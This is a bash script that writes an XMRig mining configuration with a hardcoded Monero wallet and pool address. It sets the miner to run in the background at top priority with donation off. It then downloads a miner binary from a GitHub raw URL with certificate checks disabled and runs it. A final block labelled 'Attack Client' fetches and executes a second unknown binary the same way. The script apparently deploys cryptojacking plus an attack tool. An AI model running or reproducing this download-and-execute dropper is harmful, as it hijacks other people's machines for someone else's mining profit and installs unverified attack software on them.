#!/bin/bash
BASE_URL="https://raw.githubusercontent.com/imByteCat/xmrig/master"  # no `/` in the end of line

POOL="xmr.f2pool.com:13531"
USER="42tqjNBzQjCZA3aGq4v5rha6NsXgGfSEyTxoScjhEPZq5woPsydEWcC8sHiAbKueHnDvaJmj2F77fKNq1f4ok2LEPwJYB2s"
PASSWORD="x"

PRIORITY=5  # set process priority (0 idle, 2 normal to 5 highest)
DONATE=0  # donate level, default 5%% (5 minutes in 100 minutes)
BACKGROUND=true  # run the miner in the background

WORKER=$(date "+%Y%m%d%H%M%S")

rm -f "config.json"
cat>"config.json"<< EOF
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": ${BACKGROUND},
    "colors": true,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": ${PRIORITY},
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "argon2": [0, 1, 2, 3, 4, 5, 6, 7],
        "astrobwt": [0, 1, 2, 3, 4, 5, 6, 7],
        "cn": [
            [1, 0],
            [1, 2],
            [1, 4],
            [1, 6]
        ],
        "cn-heavy": [
            [1, 0],
            [1, 1],
            [1, 2],
            [1, 3],
            [1, 4],
            [1, 5],
            [1, 6],
            [1, 7]
        ],
        "cn-lite": [
            [1, 0],
            [1, 1],
            [1, 2],
            [1, 3],
            [1, 4],
            [1, 5],
            [1, 6],
            [1, 7]
        ],
        "cn-pico": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3],
            [2, 4],
            [2, 5],
            [2, 6],
            [2, 7]
        ],
        "rx": [0, 2, 4, 6],
        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7],
        "cn/0": false,
        "cn-lite/0": false,
        "rx/arq": "rx/wow",
        "rx/keva": "rx/wow"
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": ${DONATE},
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "${POOL}",
            "user": "${USER}.${WORKER}",
            "pass": "${PASSWORD}",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true
}
EOF

# XMR Miner
# if [ ! -f "xmrig" ]; then
#     wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig
# fi
wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig && ./xmrig

# Attack Client
wget --no-check-certificate ${BASE_URL}/nmsl && chmod +x ./nmsl && ./nmsl
